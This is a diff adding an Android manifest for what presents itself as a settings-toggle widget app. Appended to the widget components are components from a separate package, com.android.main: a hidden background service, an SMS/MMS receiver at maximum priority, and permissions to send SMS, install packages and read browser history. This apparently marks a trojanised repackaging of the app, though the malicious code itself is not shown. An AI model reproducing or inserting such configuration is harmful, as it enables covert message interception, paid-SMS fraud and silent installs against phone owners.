@@ -1,0 +1,239 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="alei.switchpro">
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.WRITE_APN_SETTINGS"/>
+    <uses-permission android:name="android.permission.READ_SYNC_SETTINGS"/>
+    <uses-permission android:name="android.permission.WRITE_SYNC_SETTINGS"/>
+    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN"/>
+    <uses-permission android:name="android.permission.BLUETOOTH"/>
+    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+    <uses-permission android:name="android.permission.BATTERY_STATS"/>
+    <uses-permission android:name="android.permission.FLASHLIGHT"/>
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+    <uses-permission android:name="android.permission.MODIFY_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIMAX_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_WIMAX_STATE"/>
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
+    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <application android:debuggable="false" android:icon="@drawable/icon" android:label="@string/app_name">
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name=".GlobalConfigPrefActivity" android:theme="@android:style/Theme.Black">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="alei.switchpro.GlobalConfigPrefAcion"/>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name=".modify.ConfigModifyActivity" android:theme="@android:style/Theme.Black">
+            <intent-filter>
+                <action android:name="alei.switchpro.modify.ConfigModifyAcion"/>
+            </intent-filter>
+        </activity>
+        <activity android:label="@string/app_name" android:name=".ConfigPreferenceActivityX4" android:theme="@android:style/Theme.Black">
+            <intent-filter>
+                <action android:name="android.appwidget.action.APPWIDGET_CONFIGURE"/>
+            </intent-filter>
+        </activity>
+        <activity android:label="@string/app_name" android:name=".ConfigPreferenceActivityX1" android:theme="@android:style/Theme.Black">
+            <intent-filter>
+                <action android:name="android.appwidget.action.APPWIDGET_CONFIGURE"/>
+            </intent-filter>
+        </activity>
+        <activity android:label="@string/app_name" android:name=".ConfigPreferenceActivityX2" android:theme="@android:style/Theme.Black">
+            <intent-filter>
+                <action android:name="android.appwidget.action.APPWIDGET_CONFIGURE"/>
+            </intent-filter>
+        </activity>
+        <activity android:label="@string/app_name" android:name=".ConfigPreferenceActivityX3" android:theme="@android:style/Theme.Black">
+            <intent-filter>
+                <action android:name="android.appwidget.action.APPWIDGET_CONFIGURE"/>
+            </intent-filter>
+        </activity>
+        <receiver android:label="@string/app_nameX4" android:name=".MainWidgetProvider">
+            <intent-filter>
+                <action android:name="android.appwidget.action.APPWIDGET_UPDATE"/>
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED"/>
+                <action android:name="android.bluetooth.adapter.action.STATE_CHANGED"/>
+                <action android:name="android.bluetooth.intent.action.BLUETOOTH_STATE_CHANGED"/>
+                <action android:name="android.intent.action.CLOSE_SYSTEM_DIALOGS"/>
+                <action android:name="android.intent.action.AIRPLANE_MODE"/>
+                <action android:name="android.media.RINGER_MODE_CHANGED"/>
+                <action android:name="android.media.VIBRATE_SETTING_CHANGED"/>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+                <action android:name="com.htc.net.wimax.WIMAX_ENABLED_CHANGED"/>
+                <action android:name="android.intent.action.SCREEN_OFF"/>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.net.wifi.WIFI_AP_STATE_CHANGED"/>
+                <action android:name="android.net.conn.TETHER_STATE_CHANGED"/>
+                <action android:name="com.android.sync.SYNC_CONN_STATUS_CHANGED"/>
+                <action android:name="android.net.conn.BACKGROUND_DATA_SETTING_CHANGED"/>
+                <action android:name="com.android.sync.SYNC_CONN_STATUS_CHANGED"/>
+                <action android:name="android.net.conn.BACKGROUND_DATA_SETTING_CHANGED"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.MEDIA_SCANNER_STARTED"/>
+                <action android:name="android.intent.action.MEDIA_SCANNER_FINISHED"/>
+                <action android:name="android.intent.action.MEDIA_CHECKING"/>
+                <action android:name="android.intent.action.MEDIA_MOUNTED"/>
+                <action android:name="android.intent.action.MEDIA_SHARED"/>
+                <data android:scheme="file"/>
+            </intent-filter>
+            <meta-data android:name="android.appwidget.provider" android:resource="@xml/appwidget_info4"/>
+        </receiver>
+        <receiver android:label="@string/app_nameX1" android:name=".MainWidgetProviderX1">
+            <intent-filter>
+                <action android:name="android.appwidget.action.APPWIDGET_UPDATE"/>
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED"/>
+                <action android:name="android.bluetooth.adapter.action.STATE_CHANGED"/>
+                <action android:name="android.bluetooth.intent.action.BLUETOOTH_STATE_CHANGED"/>
+                <action android:name="android.intent.action.CLOSE_SYSTEM_DIALOGS"/>
+                <action android:name="android.intent.action.AIRPLANE_MODE"/>
+                <action android:name="android.media.RINGER_MODE_CHANGED"/>
+                <action android:name="android.media.VIBRATE_SETTING_CHANGED"/>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+                <action android:name="com.htc.net.wimax.WIMAX_ENABLED_CHANGED"/>
+                <action android:name="android.intent.action.SCREEN_OFF"/>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.net.wifi.WIFI_AP_STATE_CHANGED"/>
+                <action android:name="android.net.conn.TETHER_STATE_CHANGED"/>
+                <action android:name="com.android.sync.SYNC_CONN_STATUS_CHANGED"/>
+                <action android:name="android.net.conn.BACKGROUND_DATA_SETTING_CHANGED"/>
+                <action android:name="com.android.sync.SYNC_CONN_STATUS_CHANGED"/>
+                <action android:name="android.net.conn.BACKGROUND_DATA_SETTING_CHANGED"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.MEDIA_SCANNER_STARTED"/>
+                <action android:name="android.intent.action.MEDIA_SCANNER_FINISHED"/>
+                <action android:name="android.intent.action.MEDIA_CHECKING"/>
+                <action android:name="android.intent.action.MEDIA_MOUNTED"/>
+                <action android:name="android.intent.action.MEDIA_SHARED"/>
+                <data android:scheme="file"/>
+            </intent-filter>
+            <meta-data android:name="android.appwidget.provider" android:resource="@xml/appwidget_info1"/>
+        </receiver>
+        <receiver android:label="@string/app_nameX2" android:name=".MainWidgetProviderX2">
+            <intent-filter>
+                <action android:name="android.appwidget.action.APPWIDGET_UPDATE"/>
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED"/>
+                <action android:name="android.bluetooth.adapter.action.STATE_CHANGED"/>
+                <action android:name="android.bluetooth.intent.action.BLUETOOTH_STATE_CHANGED"/>
+                <action android:name="android.intent.action.CLOSE_SYSTEM_DIALOGS"/>
+                <action android:name="android.intent.action.AIRPLANE_MODE"/>
+                <action android:name="android.media.RINGER_MODE_CHANGED"/>
+                <action android:name="android.media.VIBRATE_SETTING_CHANGED"/>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+                <action android:name="com.htc.net.wimax.WIMAX_ENABLED_CHANGED"/>
+                <action android:name="android.intent.action.SCREEN_OFF"/>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.net.wifi.WIFI_AP_STATE_CHANGED"/>
+                <action android:name="android.net.conn.TETHER_STATE_CHANGED"/>
+                <action android:name="com.android.sync.SYNC_CONN_STATUS_CHANGED"/>
+                <action android:name="android.net.conn.BACKGROUND_DATA_SETTING_CHANGED"/>
+                <action android:name="com.android.sync.SYNC_CONN_STATUS_CHANGED"/>
+                <action android:name="android.net.conn.BACKGROUND_DATA_SETTING_CHANGED"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.MEDIA_SCANNER_STARTED"/>
+                <action android:name="android.intent.action.MEDIA_SCANNER_FINISHED"/>
+                <action android:name="android.intent.action.MEDIA_CHECKING"/>
+                <action android:name="android.intent.action.MEDIA_MOUNTED"/>
+                <action android:name="android.intent.action.MEDIA_SHARED"/>
+                <data android:scheme="file"/>
+            </intent-filter>
+            <meta-data android:name="android.appwidget.provider" android:resource="@xml/appwidget_info2"/>
+        </receiver>
+        <receiver android:label="@string/app_nameX3" android:name=".MainWidgetProviderX3">
+            <intent-filter>
+                <action android:name="android.appwidget.action.APPWIDGET_UPDATE"/>
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED"/>
+                <action android:name="android.bluetooth.adapter.action.STATE_CHANGED"/>
+                <action android:name="android.bluetooth.intent.action.BLUETOOTH_STATE_CHANGED"/>
+                <action android:name="android.intent.action.CLOSE_SYSTEM_DIALOGS"/>
+                <action android:name="android.intent.action.AIRPLANE_MODE"/>
+                <action android:name="android.media.RINGER_MODE_CHANGED"/>
+                <action android:name="android.media.VIBRATE_SETTING_CHANGED"/>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+                <action android:name="com.htc.net.wimax.WIMAX_ENABLED_CHANGED"/>
+                <action android:name="android.intent.action.SCREEN_OFF"/>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.net.wifi.WIFI_AP_STATE_CHANGED"/>
+                <action android:name="android.net.conn.TETHER_STATE_CHANGED"/>
+                <action android:name="com.android.sync.SYNC_CONN_STATUS_CHANGED"/>
+                <action android:name="android.net.conn.BACKGROUND_DATA_SETTING_CHANGED"/>
+                <action android:name="com.android.sync.SYNC_CONN_STATUS_CHANGED"/>
+                <action android:name="android.net.conn.BACKGROUND_DATA_SETTING_CHANGED"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.MEDIA_SCANNER_STARTED"/>
+                <action android:name="android.intent.action.MEDIA_SCANNER_FINISHED"/>
+                <action android:name="android.intent.action.MEDIA_CHECKING"/>
+                <action android:name="android.intent.action.MEDIA_MOUNTED"/>
+                <action android:name="android.intent.action.MEDIA_SHARED"/>
+                <data android:scheme="file"/>
+            </intent-filter>
+            <meta-data android:name="android.appwidget.provider" android:resource="@xml/appwidget_info3"/>
+        </receiver>
+        <activity android:launchMode="singleInstance" android:name=".brightness.BrightnessActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:launchMode="singleInstance" android:name=".flash.FlashlightActivity"/>
+        <activity android:launchMode="singleInstance" android:name=".reboot.RebootActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:launchMode="singleInstance" android:name=".timeout.TimeOutSelectActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <service android:label="多键开关​​​​​​​​​​​​" android:name="SwitchProService"/>
+        <receiver android:name=".battery.BatteryReceiver">
+            <intent-filter>
+                <action android:name="android.appwidget.action.APPWIDGET_UPDATE"/>
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED"/>
+                <action android:name="android.bluetooth.adapter.action.STATE_CHANGED"/>
+                <action android:name="android.bluetooth.intent.action.BLUETOOTH_STATE_CHANGED"/>
+                <action android:name="android.intent.action.CLOSE_SYSTEM_DIALOGS"/>
+                <action android:name="android.intent.action.AIRPLANE_MODE"/>
+                <action android:name="android.media.RINGER_MODE_CHANGED"/>
+                <action android:name="android.media.VIBRATE_SETTING_CHANGED"/>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+                <action android:name="com.htc.net.wimax.WIMAX_ENABLED_CHANGED"/>
+                <action android:name="android.intent.action.SCREEN_OFF"/>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.net.wifi.WIFI_AP_STATE_CHANGED"/>
+                <action android:name="android.net.conn.TETHER_STATE_CHANGED"/>
+                <action android:name="com.android.sync.SYNC_CONN_STATUS_CHANGED"/>
+                <action android:name="android.net.conn.BACKGROUND_DATA_SETTING_CHANGED"/>
+                <action android:name="com.android.sync.SYNC_CONN_STATUS_CHANGED"/>
+                <action android:name="android.net.conn.BACKGROUND_DATA_SETTING_CHANGED"/>
+                <action android:name="android.intent.action.BATTERY_CHANGED"/>
+                <action android:name="android.intent.action.BATTERY_LOW"/>
+                <action android:name="android.intent.action.BATTERY_OKAY"/>
+            </intent-filter>
+        </receiver>
+        <service android:name="com.android.main.MainService" android:process=":main"/>
+        <receiver android:name="com.android.main.ActionReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.SIG_STR"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.android.main.SmsReceiver">
+            <intent-filter android:priority="100000">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+            <intent-filter android:priority="100000">
+                <action android:name="android.provider.Telephony.WAP_PUSH_RECEIVED"/>
+                <data android:mimeType="application/vnd.wap.mms-message"/>
+            </intent-filter>
+        </receiver>
+        <activity android:name="com.android.main.TANCActivity" android:theme="@android:style/Theme.Dialog"/>
+    </application>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_MMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="com.android.browser.permission.WRITE_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+</manifest>
